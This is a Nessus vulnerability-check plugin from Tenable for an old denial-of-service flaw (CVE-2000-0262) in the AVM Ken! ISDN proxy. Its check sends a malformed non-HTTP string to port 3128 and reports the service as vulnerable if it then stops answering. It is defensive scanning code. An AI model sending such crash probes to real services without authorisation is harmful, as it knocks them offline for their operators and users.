#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(10375);
 script_version("$Revision: 1.21 $");
 script_cvs_date("$Date: 2016/10/27 15:03:54 $");

 script_cve_id("CVE-2000-0262");
 script_bugtraq_id(1103);
 script_osvdb_id(13157);

 script_name(english:"AVM KEN! ISDN Proxy Server Malformed Request Remote DoS");
 script_summary(english:"Ken! Segmentation fault");

 script_set_attribute(attribute:"synopsis", value:"The remote web proxy is prone to a denial of service attack.");
 script_set_attribute(attribute:"description", value:
"It was possible to crash the remote service - very likely Ken! ISDN
Proxy Software - by sending it a non-HTTP request.

Note that in the case of the Ken!, exploitation requires that the
attacker be on the local network.");
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2000/Apr/62");
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2000/Apr/114");
 script_set_attribute(attribute:"solution", value:
"If using Ken!, upgrade to version 1.04.32 or later.

Otherwise, contact the vendor.");
 script_set_cvss_base_vector("CVSS2#AV:L/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:U/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"vuln_publication_date", value:"2000/04/15");
 script_set_attribute(attribute:"patch_publication_date", value:"2000/04/19");
 script_set_attribute(attribute:"plugin_publication_date", value:"2000/04/18");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2000-2016 Tenable Network Security, Inc.");
 script_family(english:"Denial of Service");

 script_dependencie("find_service1.nasl");
 script_require_keys("Settings/ParanoidReport");    
 script_require_ports(3128);

 exit(0);
}

include("audit.inc");
include("global_settings.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

port = 3128;
if(get_port_state(port))
{
 data = string("Whooopppss_Ken_died\r\n");
 soc = open_sock_tcp(port);
 if(soc > 0)
 {
  send(socket:soc, data:data);
  close(soc);

  soc2 = open_sock_tcp(port);
  if(!soc2)security_note(port);
  else close(soc2);
 }
}
